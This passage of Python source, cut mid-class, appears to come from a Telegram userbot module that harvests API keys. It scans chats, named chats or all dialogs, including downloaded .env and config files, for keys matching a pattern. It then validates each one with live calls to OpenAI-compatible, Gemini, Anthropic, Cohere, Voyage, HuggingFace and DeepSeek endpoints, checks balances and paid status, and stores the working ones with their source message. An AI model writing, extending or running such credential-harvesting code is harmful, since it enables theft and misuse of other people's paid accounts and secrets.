                self._btn(self.strings["btn_settings"], self.ks_settings_menu, ("main",), "primary"),
                self._btn(self.strings["btn_clear"], self.ks_clr_menu, style="danger"),
            ],
        ]

    def _provider_filter_value(self, filter_mode: str | None):
        if isinstance(filter_mode, str) and filter_mode.startswith("provider:"):
            return filter_mode.split(":", 1)[1]
        return None

    def _filter_label(self, filter_mode: str) -> str:
        provider = self._provider_filter_value(filter_mode)
        if provider:
            return provider
        return self.strings.get(f"filter_label_{filter_mode}", filter_mode)

    def _filtered_keys(self, filter_mode: str) -> dict:
        provider = self._provider_filter_value(filter_mode)
        if provider:
            return {k: v for k, v in self._keys.items() if v == provider}
        if filter_mode == "paid":
            return {k: v for k, v in self._keys.items() if self._paid_status.get(k) == "paid"}
        if filter_mode == "free":
            return {k: v for k, v in self._keys.items() if self._paid_status.get(k) == "free"}
        return dict(self._keys)

    def _provider_summary(self):
        return sorted(self._provider_stats_map().items(), key=lambda item: (-item[1]["total"], item[0].lower()))

    def _normalize_sort_mode(self, sort_mode: str | None) -> str:
        if sort_mode in {"recent", "alpha", "provider", "tier", "balance"}:
            return sort_mode
        return self._settings.get("default_sort", "recent")

    def _setting_state(self, value: bool):
        return self.strings["state_on"] if value else self.strings["state_off"]

    def _page_size(self):
        size = self._settings.get("list_page_size", 5)
        if size not in {4, 5, 6, 8}:
            size = 5
        return size

    def _models_page_size(self):
        size = self._settings.get("models_page_size", 12)
        if size not in {8, 10, 12, 15, 20}:
            size = 12
        return size

    def _mask_key(self, key: str, hidden: bool = True):
        if not hidden:
            return key
        if len(key) > 12:
            return f"{key[:4]}{'*' * 8}{key[-4:]}"
        return f"{key[:2]}***{key[-2:]}"

    def _list_row_text(self, key: str):
        provider = self._keys.get(key, "Unknown")
        tier_icon = {"paid": "💳", "free": "🔋"}.get(self._paid_status.get(key, ""), "❓")
        masked = self._mask_key(key, True)
        balance_suffix = ""
        meta = self._key_meta.get(key, {})
        quota = meta.get("quota") if isinstance(meta, dict) else None
        if isinstance(quota, dict) and quota.get("kind") == "usage":
            try:
                val = float(str(quota.get("usage", "0")).replace("—", "0"))
                if val > 0:
                    balance_suffix = f" · 💰{val:.2f}"
            except (ValueError, TypeError):
                pass
        if self._settings.get("list_compact", True):
            return f"{tier_icon} {provider} · {masked}{balance_suffix}"
        models = self._ensure_model_cache().get(key, [])
        models_suffix = f" · {len(models)} models" if models else ""
        return f"{tier_icon} {provider} · {masked}{balance_suffix}{models_suffix}"

    def _toggle_autocatch_target(self, target):
        if target is None:
            return False
        if target in self._auto_chats:
            self._auto_chats.remove(target)
            self._save()
            return False
        self._auto_chats.append(target)
        self._save()
        return True

    def _callback_chat_id(self, call):
        for source in (call, getattr(call, "message", None)):
            if source is None:
                continue
            chat_id = getattr(source, "chat_id", None)
            if chat_id is not None:
                return chat_id
        return None

    def _sort_keys_for_view(self, keys_list, sort_mode: str):
        sort_mode = self._normalize_sort_mode(sort_mode)
        if sort_mode == "recent":
            order = {key: idx for idx, key in enumerate(self._keys.keys())}
            return sorted(keys_list, key=lambda key: order.get(key, -1), reverse=True)
        if sort_mode == "provider":
            return sorted(keys_list, key=lambda key: ((self._keys.get(key) or "").lower(), key.lower()))
        if sort_mode == "tier":
            tier_weight = {"paid": 0, "free": 1, "unknown": 2, "": 2}
            return sorted(
                keys_list,
                key=lambda key: (
                    tier_weight.get(self._paid_status.get(key, "unknown"), 2),
                    (self._keys.get(key) or "").lower(),
                    key.lower(),
                ),
            )
        if sort_mode == "balance":
            def _balance_val(key):
                meta = self._key_meta.get(key, {})
                quota = meta.get("quota") if isinstance(meta, dict) else None
                if isinstance(quota, dict) and quota.get("kind") == "usage":
                    try:
                        return float(str(quota.get("usage", "0")).replace("—", "0"))
                    except (ValueError, TypeError):
                        pass
                return -1
            return sorted(keys_list, key=lambda k: (_balance_val(k), (self._keys.get(k) or "").lower()), reverse=True)
        return sorted(keys_list, key=str.lower)

    def _parse_scan_args(self, raw_args: str, default_limit: int):
        tokens = [token for token in (raw_args or "").split() if token]
        global_mode = False
        limit = default_limit
        scan_mode = "simple"
        include_files = False
        target_chat = None
        numeric_tokens = [t for t in tokens if t.lstrip("-").isdigit()]
        has_chat_id = len(numeric_tokens) >= 2 or (len(numeric_tokens) == 1 and any(t.startswith("@") for t in tokens))
        for token in tokens:
            low = token.lower()
            if has_chat_id and target_chat is None and (token.lstrip("-").isdigit() or low.startswith("@")):
                target_chat = token
                continue
            if low in {"global", "all", "-g", "--global"}:
                global_mode = True
                continue
            if low in {"fast", "quick", "search"}:
                scan_mode = "fast"
                continue
            if low in {"simple", "normal", "hybrid", "обычный", "простой"}:
                scan_mode = "simple"
                continue
            if low in {"deep", "full", "raw", "slow", "глубокий", "дип"}:
                scan_mode = "deep"
                continue
            if low in {"files", "file", "withfiles", "attachments", "файлы"}:
                include_files = True
                continue
            if token.isdigit():
                limit = int(token)
        return global_mode, limit, scan_mode, include_files, target_chat

    def _message_text_for_scan(self, message) -> str:
        return (
            getattr(message, "raw_text", None)
            or getattr(message, "message", None)
            or getattr(message, "text", None)
            or ""
        )

    def _is_text_file_message(self, message) -> bool:
        file = getattr(message, "file", None)
        if not file:
            return False
        mime = getattr(file, "mime_type", "") or ""
        name = (getattr(file, "name", "") or "").lower()
        size = int(getattr(file, "size", 0) or 0)
        text_exts = (".txt", ".json", ".env", ".py", ".js", ".ts", ".sh",
                     ".yaml", ".yml", ".toml", ".ini", ".cfg", ".log", ".md",
                     ".xml", ".csv", ".conf", ".properties")
        text_mimes = ("text/", "application/json", "application/x-yaml",
                      "application/xml", "application/x-sh")
        return (size == 0 or size <= self._max_file_scan_size) and (
            any(mime.startswith(m) for m in text_mimes) or any(name.endswith(e) for e in text_exts)
        )

    async def _message_texts_for_scan(self, message, include_files: bool = False):
        texts = []
        text = self._message_text_for_scan(message)
        if text:
            texts.append(text)
        if include_files and self._settings.get("file_scan", True) and self._is_text_file_message(message):
            try:
                raw = await self.client.download_media(message, bytes)
                if raw:
                    texts.append(raw.decode("utf-8", errors="ignore"))
            except Exception:
                pass
        return texts

    def _remember_key_origin(self, key: str, message, key_origins: dict):
        if key in key_origins:
            return
        message_id = getattr(message, "id", None)
        chat_id = getattr(message, "chat_id", None)
        key_origins[key] = {
            "source_message_id": message_id if message_id else None,
            "source_chat_username": self._peer_username_for_link(message),
            "message_link_chat_id": chat_id,
        }

    def _collect_keys_with_origin(self, text: str, message, found: set, key_origins: dict):
        keys = self.key_regex.findall(text)
        if not keys:
            return
        found.update(keys)
        for key in keys:
            self._remember_key_origin(key, message, key_origins)

    async def _scan_search_prefixes(
        self,
        target,
        limit: int,
        found: set,
        key_origins: dict,
        include_files: bool = False,
    ) -> int:
        scanned = 0
        per_prefix_limit = min(limit, 5000) if target is None else limit
        for query in self.search_queries:
            try:
                async for message in self.client.iter_messages(target, search=query, limit=per_prefix_limit):
                    scanned += 1
                    for text in await self._message_texts_for_scan(message, include_files=include_files):
                        if text:
                            self._collect_keys_with_origin(text, message, found, key_origins)
            except FloodWaitError as e:
                wait = getattr(e, "seconds", None) or getattr(e, "x", 5)
                await asyncio.sleep(int(wait))
            except Exception:
                pass
            await asyncio.sleep(0.25)
        return scanned

    async def _scan_raw_messages(
        self,
        target,
        limit: int,
        found: set,
        key_origins: dict,
        include_files: bool = False,
    ) -> int:
        scanned = 0
        try:
            async for message in self.client.iter_messages(target, limit=limit):
                scanned += 1
                for text in await self._message_texts_for_scan(message, include_files=include_files):
                    if text and self._text_might_contain_key(text):
                        self._collect_keys_with_origin(text, message, found, key_origins)
        except FloodWaitError as e:
            wait = getattr(e, "seconds", None) or getattr(e, "x", 5)
            await asyncio.sleep(int(wait))
        except Exception:
            pass
        return scanned

    async def _scan_global_dialogs(self, limit: int, found: set, key_origins: dict, include_files: bool = False) -> int:
        scanned = 0
        try:
            async for dialog in self.client.iter_dialogs():
                if scanned >= limit:
                    break
                entity = getattr(dialog, "entity", None) or dialog
                per_dialog = min(5000, max(0, limit - scanned))
                if per_dialog <= 0:
                    break
                try:
                    async for message in self.client.iter_messages(entity, limit=per_dialog):
                        scanned += 1
                        for text in await self._message_texts_for_scan(message, include_files=include_files):
                            if text and self._text_might_contain_key(text):
                                self._collect_keys_with_origin(text, message, found, key_origins)
                        if scanned >= limit:
                            break
                except Exception:
                    pass
        except Exception:
            pass
        return scanned

    def _is_autocatch_enabled_for(self, chat_id) -> bool:
        return GLOBAL_AUTOCATCH in self._auto_chats or chat_id in self._auto_chats

    async def _run_scan(self, message: Message, limit: int, global_mode: bool, scan_mode: str = "simple", include_files: bool = False, target_chat=None):
        if target_chat is not None:
            try:
                resolved = await self._resolve_entity_best_effort(target_chat)
                target = resolved if resolved is not None else message.to_id
            except Exception:
                target = message.to_id
        else:
            target = None if global_mode else message.to_id
        progress_key = "global_scanning" if global_mode else "scanning"
        source = "Global Scan" if global_mode else (target if target_chat is not None else getattr(message.to_id, "chat_id", "ScanLLM"))
        via = "global" if global_mode else "scan"
        msg = await self._answer(message, self.strings[progress_key].format(limit=limit))
        found = set()
        key_origins = {}
        scan_mode = scan_mode if scan_mode in {"fast", "simple", "deep"} else "simple"
        scanned_count = 0

        scanned_count += await self._scan_search_prefixes(target, limit, found, key_origins, include_files=include_files)
        if scan_mode != "fast":
            raw_limit = limit
            if scan_mode == "simple":
                raw_limit = min(limit, 50_000 if global_mode else 10_000)
            if global_mode:
                scanned_count += await self._scan_global_dialogs(raw_limit, found, key_origins, include_files=include_files)
            else:
                scanned_count += await self._scan_raw_messages(target, raw_limit, found, key_origins, include_files=include_files)

        valid_count = 0
        if found:
            safe_mode = bool(self._settings.get("safe_auto_checks", True))
            async with self._http_session() as session:
                tasks = [self._validate_key(session, k, allow_spend=not safe_mode) for k in found]
                results = await self._gather_chunked(tasks)
                for key, (prov, ok) in zip(found, results):
                    if ok and key not in self._keys:
                        origin = key_origins.get(key, {})
                        valid_count += 1
                        await self._register_key(
                            session,
                            key,
                            prov,
                            source,
                            via=via,
                            safe_mode=safe_mode,
                            source_message_id=origin.get("source_message_id"),
                            source_chat_username=origin.get("source_chat_username"),
                            message_link_chat_id=origin.get("message_link_chat_id"),
                        )
            self._save()

        await self._answer(msg, self.strings["found"].format(valid_count=valid_count, raw_count=len(found), scanned_count=scanned_count))

    def _style(self, kind: str | None):
        if not self._settings.get("color_buttons", True):
            return None
        return {"danger": "danger", "success": "success", "primary": "primary"}.get(kind or "", None)

    def _btn(self, text: str, callback, args=None, style: str | None = None):
        btn = {"text": self._ui_text(text), "callback": callback}
        if args is not None:
            btn["args"] = args
        btn_style = self._style(style)
        if btn_style:
            btn["style"] = btn_style
        return btn

    def _ui_text(self, text):
        if not isinstance(text, str):
            return text
        if self._settings.get("premium_emoji", True):
            return text
        return re.sub(r"<tg-emoji\b[^>]*>(.*?)</tg-emoji>", r"\1", text, flags=re.S)

    def _ui_markup(self, markup):
        if markup is None:
            return None
        if isinstance(markup, list):
            return [self._ui_markup(item) for item in markup]
        if isinstance(markup, dict):
            item = dict(markup)
            if "text" in item:
                item["text"] = self._ui_text(item["text"])
            if not self._settings.get("color_buttons", True):
                item.pop("style", None)
            return item
        return markup

    async def _answer(self, message, text, **kwargs):
        if "reply_markup" in kwargs:
            kwargs["reply_markup"] = self._ui_markup(kwargs["reply_markup"])
        return await utils.answer(message, self._ui_text(text), **kwargs)

    def _preview_banner(self, provider: str | None = None) -> str | None:
        """Return banner URL for preview. Uses provider-specific banner if available."""
        if not self._settings.get("show_preview", True):
            return None
        if provider:
            key = str(provider).lower().strip()
            banner = PROVIDER_BANNERS.get(key)
            if banner:
                return banner
        return BANNER_URL

    async def _empty_loading_button(self, call):
        try:
            await call.answer(EMPTY_LOADING_BUTTON_TEXT)
        except Exception:
            pass

    async def _edit(self, call, *, text=None, reply_markup=None, preview_banner=None, **kwargs):
        if text is not None:
            kwargs["text"] = self._ui_text(text)
        if reply_markup is not None:
            kwargs["reply_markup"] = self._ui_markup(reply_markup)
        if preview_banner is not None and _LinkPreviewOptions is not None:
            try:
                options = _LinkPreviewOptions(url=preview_banner, show_above_text=True, prefer_large_media=True)
                markup = self.inline.generate_markup(kwargs.get("reply_markup", []))
                bot = getattr(self.inline, "bot", None)
                if bot:
                    arguments = {
                        "text": kwargs.get("text", ""),
                        "reply_markup": markup,
                        "link_preview_options": options,
                        "parse_mode": "HTML",
                    }
                    inline_id = getattr(call, "inline_message_id", None)
                    if inline_id:
                        arguments["inline_message_id"] = inline_id
                    else:
                        message = getattr(call, "message", call)
                        chat = getattr(getattr(message, "chat", message), "id", getattr(message, "chat_id", None))
                        identifier = getattr(message, "message_id", getattr(message, "id", None))
                        if chat and identifier:
                            arguments["chat_id"] = chat
                            arguments["message_id"] = identifier
                        else:
                            return await call.edit(**kwargs)
                    return await bot.edit_message_text(**arguments)
            except Exception:
                pass
        return await call.edit(**kwargs)

    def _models_text(self, models, limit: int = 5, provider: str | None = None):
        models = [m for m in dict.fromkeys(models or []) if m]
        if provider:
            models = self._sort_models(provider, models)
        if not models:
            return "—"
        if len(models) <= limit:
            return ", ".join(models)
        return ", ".join(models[:limit]) + f" … (+{len(models) - limit})"

    def _models_list_text(self, models, provider: str | None = None, limit: int = 80):
        models = self._sort_models(provider, models or []) if provider else [m for m in dict.fromkeys(models or []) if m]
        if not models:
            return "—"
        shown = models[:limit]
        body = "\n".join(f"<code>{html.escape(str(model))}</code>" for model in shown)
        if len(models) > limit:
            body += f"\n… (+{len(models) - limit})"
        return body

    def _paginate_models(self, models, page: int, page_size: int):
        models = [m for m in dict.fromkeys(models or []) if m]
        total = len(models)
        total_pages = max(1, (total + page_size - 1) // page_size)
        page = max(0, min(int(page or 0), total_pages - 1))
        start = page * page_size
        return models[start:start + page_size], page, total_pages, total

    def _age_text(self, ts: int | float | None):
        if not ts:
            return "—"
        delta = max(0, self._now_ts() - int(ts))
        if delta < 60:
            return f"{delta}s"
        if delta < 3600:
            return f"{delta // 60}m"
        if delta < 86400:
            return f"{delta // 3600}h"
        return f"{delta // 86400}d"

    def _header_value(self, headers, *names):
        for name in names:
            value = headers.get(name)
            if value is not None:
                return str(value)
        return None

    def _quota_from_headers(self, provider: str, headers):
        req_limit = self._header_value(headers, "x-ratelimit-limit-requests", "X-RateLimit-Limit-Requests")
        req_left = self._header_value(headers, "x-ratelimit-remaining-requests", "X-RateLimit-Remaining-Requests")
        tok_limit = self._header_value(headers, "x-ratelimit-limit-tokens", "X-RateLimit-Limit-Tokens")
        tok_left = self._header_value(headers, "x-ratelimit-remaining-tokens", "X-RateLimit-Remaining-Tokens")
        req_reset = self._header_value(headers, "x-ratelimit-reset-requests", "X-RateLimit-Reset-Requests")
        if not any((req_limit, req_left, tok_limit, tok_left, req_reset)):
            return None
        return {
            "kind": "rate",
            "provider": provider,
            "checked_at": self._now_ts(),
            "req_limit": req_limit,
            "req_left": req_left,
            "tok_limit": tok_limit,
            "tok_left": tok_left,
            "req_reset": req_reset,
        }

    def _format_quota(self, quota):
        if not isinstance(quota, dict):
            return self.strings["quota_unknown"]
        if quota.get("kind") == "rate":
            req_left = quota.get("req_left") or "—"
            req_limit = quota.get("req_limit") or "—"
            tok_left = quota.get("tok_left") or "—"
            tok_limit = quota.get("tok_limit") or "—"
            return self.strings["quota_rate"].format(
                req=f"{req_left}/{req_limit}",
                tok=f"{tok_left}/{tok_limit}",
                reset=quota.get("req_reset") or "—",
                age=self._age_text(quota.get("checked_at")),
            )
        if quota.get("kind") == "usage":
            return self.strings["quota_usage"].format(
                usage=quota.get("usage", "—"),
                limit=quota.get("limit", "—"),
                left=quota.get("left", "—"),
            )
        if quota.get("kind") == "unsupported":
            return self.strings["quota_unsupported"]
        if quota.get("kind") == "error":
            message = quota.get("message")
            if message:
                return f"{self.strings['quota_error']}: <code>{html.escape(str(message))}</code>"
            return self.strings["quota_error"]
        return self.strings["quota_unknown"]

    def _quota_text(self, key: str):
        meta = self._key_meta.get(key, {}) if isinstance(getattr(self, "_key_meta", None), dict) else {}
        return self._format_quota(meta.get("quota"))

    def _quota_is_refreshable(self, quota) -> bool:
        if not isinstance(quota, dict):
            return False
        kind = quota.get("kind")
        if kind == "rate":
            return True
        if kind != "usage":
            return False
        limit = quota.get("limit")
        left = quota.get("left")
        return any(value not in (None, "", "—") for value in (limit, left))

    def _provider_supports_quota(self, provider: str, quota=None) -> bool:
        if self._quota_is_refreshable(quota):
            return True
        return provider in {"OpenRouter", "DeepSeek"}

    def _short_api_error(self, text: str) -> str:
        text = re.sub(r"\s+", " ", str(text or "")).strip()
        low = text.lower()
        if "credit balance is too low" in low:
            return "billing: credit balance is too low"
        if "insufficient_quota" in low or "quota" in low:
            return "quota/billing error"
        return text[:96] if text else self.strings["quota_error"]

    def _extract_models_from_payload(self, data) -> list:
        items = []
        if isinstance(data, dict):
            items = data.get("data") or data.get("models") or data.get("results") or []
        out = []
        for item in items or []:
            if isinstance(item, str):
                out.append(item)
                continue
            if not isinstance(item, dict):
                continue
            name = item.get("id") or item.get("name") or item.get("model")
            if name:
                out.append(str(name).rsplit("/", 1)[-1])
        return [m for m in dict.fromkeys(out) if m]

    def _extract_reply_text(self, data) -> str:
        texts = []
        if isinstance(data, dict):
            content = data.get("content")
            if isinstance(content, list):
                for part in content:
                    if not isinstance(part, dict):
                        continue
                    text = part.get("text")
                    if isinstance(text, str) and text.strip():
                        texts.append(text.strip())
            choices = data.get("choices")
            if isinstance(choices, list):
                for choice in choices:
                    if not isinstance(choice, dict):
                        continue
                    message = choice.get("message")
                    if isinstance(message, dict):
                        msg_content = message.get("content")
                        if isinstance(msg_content, str) and msg_content.strip():
                            texts.append(msg_content.strip())
                        elif isinstance(msg_content, list):
                            for part in msg_content:
                                if not isinstance(part, dict):
                                    continue
                                text = part.get("text")
                                if isinstance(text, str) and text.strip():
                                    texts.append(text.strip())
                        reasoning = message.get("reasoning_content")
                        if isinstance(reasoning, str) and reasoning.strip():
                            texts.append(reasoning.strip())
                    text = choice.get("text")
                    if isinstance(text, str) and text.strip():
                        texts.append(text.strip())
            candidates = data.get("candidates")
            if isinstance(candidates, list):
                for candidate in candidates:
                    if not isinstance(candidate, dict):
                        continue
                    content = candidate.get("content") or {}
                    if isinstance(content, dict):
                        parts = content.get("parts") or []
                        for part in parts:
                            if not isinstance(part, dict):
                                continue
                            text = part.get("text")
                            if isinstance(text, str) and text.strip():
                                texts.append(text.strip())
            message = data.get("message")
            if isinstance(message, dict):
                parts = message.get("content")
                if isinstance(parts, list):
                    for part in parts:
                        if not isinstance(part, dict):
                            continue
                        text = part.get("text")
                        if isinstance(text, str) and text.strip():
                            texts.append(text.strip())
            generations = data.get("generations")
            if isinstance(generations, list):
                for item in generations:
                    if not isinstance(item, dict):
                        continue
                    text = item.get("text")
                    if isinstance(text, str) and text.strip():
                        texts.append(text.strip())
            text = data.get("text")
            if isinstance(text, str) and text.strip():
                texts.append(text.strip())
        return next((text for text in texts if text), "")

    def _candidate_text_models(self, provider: str, models) -> list:
        provider = provider or ""
        clean = []
        bad_tokens = (
            "embed", "embedding", "rerank", "moderation", "whisper", "tts",
            "speech", "transcribe", "audio", "image", "vision-preview",
            "omni-moderation", "safety", "guard", "realtime",
        )
        for model in models or []:
            if not model:
                continue
            name = str(model).rsplit("/", 1)[-1]
            low = name.lower()
            if any(token in low for token in bad_tokens):
                continue
            clean.append(name)
        if provider == "Gemini":
            clean = [m for m in clean if m.lower().startswith("gemini-")]
        elif provider == "Anthropic":
            clean = [m for m in clean if m.lower().startswith("claude")]
        elif provider == "Cohere":
            clean = [m for m in clean if "command" in m.lower() or "chat" in m.lower()]
        elif provider == "Voyage":
            clean = [m for m in clean if "rerank" not in m.lower()]
        return [m for m in dict.fromkeys(clean) if m]

    async def _probe_openai_compatible_response(self, session, provider: str, key: str, base_url: str, models=None, headers=None, fallback_models=None):
        req_headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        if headers:
            req_headers.update(headers)
        probe_models = list(models or [])
        if not probe_models:
            try:
                async with session.get(f"{base_url}/models", headers=req_headers, timeout=6) as r:
                    if r.status == 200:
                        payload = await r.json()
                        probe_models = self._extract_models_from_payload(payload)
            except Exception:
                probe_models = []
        probe_models = self._candidate_text_models(provider, probe_models or fallback_models or [])
        for model in probe_models[:5]:
            payload = {
                "model": model,
                "messages": [{"role": "user", "content": "1"}],
                "max_tokens": 1,
                "temperature": 0,
            }
            try:
                async with session.post(f"{base_url}/chat/completions", headers=req_headers, json=payload, timeout=8) as r:
                    body = await r.text()
                    if r.status == 200:
                        try:
                            data = json.loads(body)
                        except Exception:
                            data = {}
                        if self._extract_reply_text(data):
                            return True, model
                    low = body.lower()
                    if "credit balance is too low" in low or "insufficient_quota" in low:
                        return False, None
                    if any(token in low for token in ("model", "not found", "does not exist", "unsupported", "unknown model")):
                        continue
            except Exception:
                continue
        raw_fallback = list(fallback_models or [])
        for model in raw_fallback:
            if model in probe_models:
                continue
            payload = {
                "model": model,
                "messages": [{"role": "user", "content": "1"}],
                "max_tokens": 1,
                "temperature": 0,
            }
            try:
                async with session.post(f"{base_url}/chat/completions", headers=req_headers, json=payload, timeout=8) as r:
                    body = await r.text()
                    if r.status == 200:
                        try:
                            data = json.loads(body)
                        except Exception:
                            data = {}
                        if self._extract_reply_text(data):
                            return True, model
                    low = body.lower()
                    if "credit balance is too low" in low or "insufficient_quota" in low:
                        return False, None
            except Exception:
                continue
        return False, None

    async def _probe_gemini_response(self, session, key: str):
        models = []
        try:
            async with session.get(
                "https://generativelanguage.googleapis.com/v1beta/models",
                params={"key": key, "pageSize": 1000},
                timeout=6,
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    raw_models = []
                    for item in data.get("models", []) or []:
                        name = (item.get("name") or "").removeprefix("models/")
                        if name:
                            raw_models.append(name)
                    models = self._candidate_text_models("Gemini", raw_models)
        except Exception:
            models = []
        fallback_models = ["gemini-2.5-flash", "gemini-2.0-flash", "gemini-1.5-flash"]
        for model in models[:5] or fallback_models:
            try:
                async with session.post(
                    f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent",
                    params={"key": key},
                    json={
                        "contents": [{"parts": [{"text": "1"}]}],
                        "generationConfig": {"maxOutputTokens": 1, "temperature": 0},
                    },
                    timeout=8,
                ) as r:
                    body = await r.text()
                    if r.status == 200:
                        try:
                            data = json.loads(body)
                        except Exception:
                            data = {}
                        if self._extract_reply_text(data):
                            return True, model
                    low = body.lower()
                    if any(token in low for token in ("not found", "unsupported", "not supported for generatecontent", "unknown model")):
                        continue
            except Exception:
                continue
        return False, None

    async def _anthropic_messages_probe(self, session, key: str):
        headers = {
            "x-api-key": key,
            "anthropic-version": "2023-06-01",
            "content-type": "application/json",
        }
        last_headers = {}
        last_text = ""
        for model in ("claude-3-5-haiku-latest", "claude-3-haiku-20240307"):
            payload = {
                "model": model,
                "max_tokens": 1,
                "messages": [{"role": "user", "content": "hi"}],
            }
            async with session.post("https://api.anthropic.com/v1/messages", headers=headers, json=payload, timeout=8) as r:
                if r.status == 200:
                    try:
                        data = await r.json()
                    except Exception:
                        data = {}
                    if self._extract_reply_text(data):
                        return True, r.headers, ""
                last_headers = r.headers
                last_text = await r.text()
                if "model" not in last_text.lower() and "not_found" not in last_text.lower():
                    break
        return False, last_headers, last_text

    async def _probe_cohere_response(self, session, key: str):
        clean_key = key.split("=", 1)[1] if key.startswith("AUTH_TOKEN=") and "=" in key else key
        headers = {"Authorization": f"Bearer {clean_key}", "Content-Type": "application/json"}
        models = []
        for url in ("https://api.cohere.com/v2/models", "https://api.cohere.com/v1/models"):
            try:
                async with session.get(url, headers=headers, timeout=6) as r:
                    if r.status != 200:
                        continue
                    data = await r.json()
                    models = self._candidate_text_models("Cohere", self._extract_models_from_payload(data))
                    if models:
                        break
            except Exception:
                continue
        fallback_models = ["command-a-03-2025", "command-r7b-12-2024", "command-r-plus-08-2024"]
        for model in models[:5] or fallback_models:
            payload = {
                "model": model,
                "messages": [{"role": "user", "content": "1"}],
                "max_tokens": 1,
                "temperature": 0,
            }
            try:
                async with session.post("https://api.cohere.com/v2/chat", headers=headers, json=payload, timeout=8) as r:
                    body = await r.text()
                    if r.status == 200:
                        try:
                            data = json.loads(body)
                        except Exception:
                            data = {}
                        if self._extract_reply_text(data):
                            return True, model
                    low = body.lower()
                    if any(token in low for token in ("model", "not found", "unsupported")):
                        continue
            except Exception:
                continue
        return False, None

    async def _probe_voyage_response(self, session, key: str):
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        models = []
        try:
            async with session.get("https://api.voyageai.com/v1/models", headers=headers, timeout=6) as r:
                if r.status == 200:
                    data = await r.json()
                    models = self._candidate_text_models("Voyage", self._extract_models_from_payload(data))
        except Exception:
            models = []
        fallback_models = ["voyage-3.5-lite", "voyage-3-lite", "voyage-3"]
        for model in models[:5] or fallback_models:
            try:
                async with session.post(
                    "https://api.voyageai.com/v1/embeddings",
                    headers=headers,
                    json={"model": model, "input": ["1"]},
                    timeout=8,
                ) as r:
                    if r.status != 200:
                        continue
                    data = await r.json()
                    vectors = data.get("data") or []
                    if vectors and isinstance(vectors[0], dict) and vectors[0].get("embedding"):
                        return True, model
            except Exception:
                continue
        return False, None

    def _hf_has_zerogpu(self, data: dict) -> bool:
        if data.get("isPro") or str(data.get("role", "")).upper() == "PRO":
            return True
        blob = json.dumps(data, ensure_ascii=False).lower()
        return any(token in blob for token in ("zerogpu", "zero_gpu", "zero-gpu"))

    async def _fetch_key_quota(self, session, key: str, provider: str):
        try:
            if provider == "OpenRouter":
                headers = {"Authorization": f"Bearer {key}"}
                async with session.get("https://openrouter.ai/api/v1/key", headers=headers, timeout=8) as r:
                    quota = self._quota_from_headers(provider, r.headers)
                    if quota:
                        return quota
                    if r.status == 200:
                        data = await r.json()
                        info = data.get("data", data) if isinstance(data, dict) else {}
                        limit = info.get("limit")
                        usage = info.get("usage")
                        left = info.get("limit_remaining")
                        if any(value is not None for value in (limit, usage, left)):
                            return {
                                "kind": "usage",
                                "provider": provider,
                                "checked_at": self._now_ts(),
                                "limit": limit if limit is not None else "—",
                                "usage": usage if usage is not None else "—",
                                "left": left if left is not None else "—",
                            }

            if provider == "Gemini":
                async with session.get(f"https://generativelanguage.googleapis.com/v1beta/models?key={key}", timeout=8) as r:
                    return self._quota_from_headers(provider, r.headers) or {"kind": "unsupported", "checked_at": self._now_ts()}

            if provider == "Anthropic" or key.startswith("sk-ant-"):
                ok, headers, err = await self._anthropic_messages_probe(session, key)
                quota = self._quota_from_headers(provider, headers)
                if ok:
                    return quota or {"kind": "usage", "provider": provider, "checked_at": self._now_ts(), "usage": "messages ok", "limit": "—", "left": "—"}
                return {"kind": "error", "provider": provider, "checked_at": self._now_ts(), "message": self._short_api_error(err)}

            if provider == "HuggingFace" or key.startswith("hf_"):
                headers = {"Authorization": f"Bearer {key}"}
                async with session.get("https://huggingface.co/api/whoami-v2", headers=headers, timeout=8) as r:
                    if r.status != 200:
                        return {"kind": "error", "provider": provider, "checked_at": self._now_ts(), "message": f"whoami-v2 {r.status}"}
                    data = await r.json()
                    has_zero = self._hf_has_zerogpu(data)
                    return {
                        "kind": "usage",
                        "provider": provider,
                        "checked_at": self._now_ts(),
                        "usage": "ZeroGPU yes" if has_zero else "ZeroGPU no",
                        "limit": "—",
                        "left": "—",
                    }

            if provider == "DeepSeek":
                try:
                    headers_ds = {"Authorization": f"Bearer {key}"}
                    async with session.get("https://api.deepseek.com/user/balance", headers=headers_ds, timeout=8) as r:
                        if r.status == 200:
                            data = await r.json()
                            infos = data.get("balance_infos") or []
                            if infos:
                                info = infos[0]
                                total = info.get("total_balance")
                                granted = info.get("granted_balance")
                                return {
                                    "kind": "usage",
                                    "provider": "DeepSeek",
                                    "checked_at": self._now_ts(),
                                    "usage": str(total) if total is not None else "—",
                                    "limit": str(granted) if granted is not None else "—",
                                    "left": str(total) if total is not None else "—",
                                }
                except Exception:
                    pass

            base = self._provider_model_base(provider)
            if base:
                base_url, auth_type = base
                headers = {"Authorization": f"Bearer {key}"} if auth_type == "Bearer" else {"x-api-key": key, "anthropic-version": "2023-06-01"}
                async with session.get(f"{base_url}/models", headers=headers, timeout=8) as r:
                    return self._quota_from_headers(provider, r.headers) or {"kind": "unsupported", "checked_at": self._now_ts()}
        except Exception:
            return {"kind": "error", "checked_at": self._now_ts()}
        return {"kind": "unsupported", "checked_at": self._now_ts()}

    def _sort_models(self, provider: str, models):
        models = [m for m in dict.fromkeys(models or []) if m]
        if not models:
            return []
        prov = (provider or "").lower()
        if prov == "gemini":
            def gemini_key(name: str):
                n = name.lower()
                version = (0, 0, 0)
                m = re.search(r"gemini-(\d+(?:\.\d+)*)", n)
                if m:
                    parts = [int(p) for p in m.group(1).split(".")]
                    version = tuple((parts + [0, 0, 0])[:3])
                tier_weight = 0
                for token, weight in (
                    ("pro-preview", 700),
                    ("pro", 650),
                    ("thinking", 600),
                    ("flash-preview", 550),
                    ("flash", 500),
                    ("preview", 450),
                    ("lite", 300),
                    ("experimental", 100),
                ):
                    if token in n:
                        tier_weight = max(tier_weight, weight)
                build = 0
                m2 = re.search(r"-(\d+)$", n)
                if m2:
                    build = -int(m2.group(1))
                return (-version[0], -version[1], -version[2], -tier_weight, build, n)
            return sorted(models, key=gemini_key)

        def generic_key(name: str):
            n = name.lower()
            weight = 0
            for token, w in (
                ("pro", 300),
                ("preview", 250),
                ("flash", 200),
                ("thinking", 180),
                ("standard", 140),
                ("lite", 120),
                ("mini", 100),
                ("small", 80),
                ("experimental", 20),
            ):
                if token in n:
                    weight = max(weight, w)
            ver = tuple(int(x) for x in re.findall(r"\d+", n)[:4])
            ver = tuple((list(ver) + [0, 0, 0, 0])[:4])
            return (-weight, tuple(-x for x in ver), n)
